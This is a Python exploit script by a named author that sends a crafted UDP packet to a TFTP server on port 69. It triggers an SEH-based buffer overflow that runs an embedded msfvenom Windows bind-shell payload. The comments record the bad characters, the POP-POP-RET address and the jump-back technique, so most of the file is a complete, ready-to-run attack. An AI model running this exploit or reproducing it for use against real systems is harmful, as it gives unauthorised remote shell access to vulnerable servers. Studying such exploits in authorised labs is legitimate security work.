#!/usr/bin/python

import socket
import sys


host = "172.16.66.128"
port = 69
#################################################
## WriTTen bY: van6uard
## Dustin Silveri
## bad characters = '\x00\x2f'
## !mona seh only shows addresses with 00 characters
## shortened 'C' buffer to allow null byte for last character.
## 00409FF1 POP-POP-RET for SEH
## nSEH jumps up 46 bytes then executes Aaron Miller's shellcode to
## make a higher jmp back up to allow enough space to execute shellcode
## 502 bytes to be exact
##
## msfvenom -p windows/shell_bind_tcp -b '\x2f\x00' -f python EXITFUNC=thread -v 'shellcode'
## [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
## [-] No arch selected, selecting arch: x86 from the payload
## Found 11 compatible encoders
## Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
## x86/shikata_ga_nai succeeded with size 355 (iteration=0)
## x86/shikata_ga_nai chosen with final size 355
## Payload size: 355 bytes
## Final size of python file: 1916 bytes
###################################################
shellcode =  ""
shellcode += "\xdd\xc4\xd9\x74\x24\xf4\xbd\xad\x43\x98\xee\x5a"
shellcode += "\x2b\xc9\xb1\x53\x83\xea\xfc\x31\x6a\x13\x03\xc7"
shellcode += "\x50\x7a\x1b\xeb\xbf\xf8\xe4\x13\x40\x9d\x6d\xf6"
shellcode += "\x71\x9d\x0a\x73\x21\x2d\x58\xd1\xce\xc6\x0c\xc1"
shellcode += "\x45\xaa\x98\xe6\xee\x01\xff\xc9\xef\x3a\xc3\x48"
shellcode += "\x6c\x41\x10\xaa\x4d\x8a\x65\xab\x8a\xf7\x84\xf9"
shellcode += "\x43\x73\x3a\xed\xe0\xc9\x87\x86\xbb\xdc\x8f\x7b"
shellcode += "\x0b\xde\xbe\x2a\x07\xb9\x60\xcd\xc4\xb1\x28\xd5"
shellcode += "\x09\xff\xe3\x6e\xf9\x8b\xf5\xa6\x33\x73\x59\x87"
shellcode += "\xfb\x86\xa3\xc0\x3c\x79\xd6\x38\x3f\x04\xe1\xff"
shellcode += "\x3d\xd2\x64\x1b\xe5\x91\xdf\xc7\x17\x75\xb9\x8c"
shellcode += "\x14\x32\xcd\xca\x38\xc5\x02\x61\x44\x4e\xa5\xa5"
shellcode += "\xcc\x14\x82\x61\x94\xcf\xab\x30\x70\xa1\xd4\x22"
shellcode += "\xdb\x1e\x71\x29\xf6\x4b\x08\x70\x9f\xb8\x21\x8a"
shellcode += "\x5f\xd7\x32\xf9\x6d\x78\xe9\x95\xdd\xf1\x37\x62"
shellcode += "\x21\x28\x8f\xfc\xdc\xd3\xf0\xd5\x1a\x87\xa0\x4d"
shellcode += "\x8a\xa8\x2a\x8d\x33\x7d\xc6\x85\x92\x2e\xf5\x68"
shellcode += "\x64\x9f\xb9\xc2\x0d\xf5\x35\x3d\x2d\xf6\x9f\x56"
shellcode += "\xc6\x0b\x20\x49\x4b\x85\xc6\x03\x63\xc3\x51\xbb"
shellcode += "\x41\x30\x6a\x5c\xb9\x12\xc2\xca\xf2\x74\xd5\xf5"
shellcode += "\x02\x53\x71\x61\x89\xb0\x45\x90\x8e\x9c\xed\xc5"
shellcode += "\x19\x6a\x7c\xa4\xb8\x6b\x55\x5e\x58\xf9\x32\x9e"
shellcode += "\x17\xe2\xec\xc9\x70\xd4\xe4\x9f\x6c\x4f\x5f\xbd"
shellcode += "\x6c\x09\x98\x05\xab\xea\x27\x84\x3e\x56\x0c\x96"
shellcode += "\x86\x57\x08\xc2\x56\x0e\xc6\xbc\x10\xf8\xa8\x16"
shellcode += "\xcb\x57\x63\xfe\x8a\x9b\xb4\x78\x93\xf1\x42\x64"
shellcode += "\x22\xac\x12\x9b\x8b\x38\x93\xe4\xf1\xd8\x5c\x3f"
shellcode += "\xb2\xf9\xbe\x95\xcf\x91\x66\x7c\x72\xfc\x98\xab"
shellcode += "\xb1\xf9\x1a\x59\x4a\xfe\x03\x28\x4f\xba\x83\xc1"
shellcode += "\x3d\xd3\x61\xe5\x92\xd4\xa3"



## 17 bytes to jump higher
jmpup = (
'\xD9\xEE\xD9\x74\x24\xF4\x59\x80\xC1\x0A\x90\xFE\xCD\xFE\xCD\xFF\xE1'
        )

buf = '\x00\x02/.:/'
buf += 'A'*(1509-46-502)
buf += '\x90'*16
buf += shellcode
buf += 'B'*(502-len(shellcode)-16)
buf += jmpup
buf += 'C'*(46-len(jmpup))
buf += '\xeb\xd0\x90\x90'
buf += '\xf1\x9f\x40\x00'
#buf += 'C'*(5000-1509-4)
#buf += '\x00\x00\x00netascii\x00'

try:
    c = socket.socket(socket.AF_INET,socket.SOCK_DGRAM) #udp socket
    c.connect((host, port))
    c.send(buf)
    print "[+] Evil buffer sent"
    c.close()

except:
    print "[-] Can't send evil buffer"
    sys.exit()
